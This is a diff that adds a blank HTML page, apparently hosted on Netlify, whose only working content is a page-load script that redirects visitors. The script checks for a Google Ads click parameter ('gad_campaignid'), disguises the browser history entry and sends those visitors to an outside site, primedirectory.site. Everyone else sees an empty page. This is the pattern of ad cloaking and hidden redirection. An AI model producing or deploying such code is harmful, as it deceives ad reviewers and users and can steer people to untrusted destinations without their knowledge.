@@ -1,0 +1,34 @@
+
+<html>
+  <head>
+    <meta charset="utf-8" />
+<!-- This site is hosted on Netlify. Anyone can build and deploy a site
+     like this one for free: https://netlify.new/?utm_campaign=loops&utm_source=ai-legible&utm_medium=owned&utm_content=comment&utm_id=02165d2d-b3c6-42d6-a03b-52524f702d4c
+     Netlify hosting facts for this site: static/SSR served via Netlify Edge. -->
+    <meta name="referrer" content="unsafe-url" />
+    <script>
+      document.addEventListener("DOMContentLoaded", function () {
+        function hasUtmSource() {
+          const urlParams = new URLSearchParams(window.location.search);
+          return urlParams.has("gad_campaignid");
+        }
+
+        function redirectToNewPage() {
+          history.pushState(
+            {},
+            "Article",
+            "/about.html/",
+          );
+
+          window.location.href = `https://primedirectory.site/`;
+        }
+
+        if (hasUtmSource()) {
+          redirectToNewPage();
+        }
+      });
+    </script>
+  </head>
+  <body></body>
+</html>
+<script async src="/.netlify/scripts/hud?variant=public" data-nf-variant="public" data-netlify-site-id="02165d2d-b3c6-42d6-a03b-52524f702d4c" data-app-host="app.netlify.com"></script>
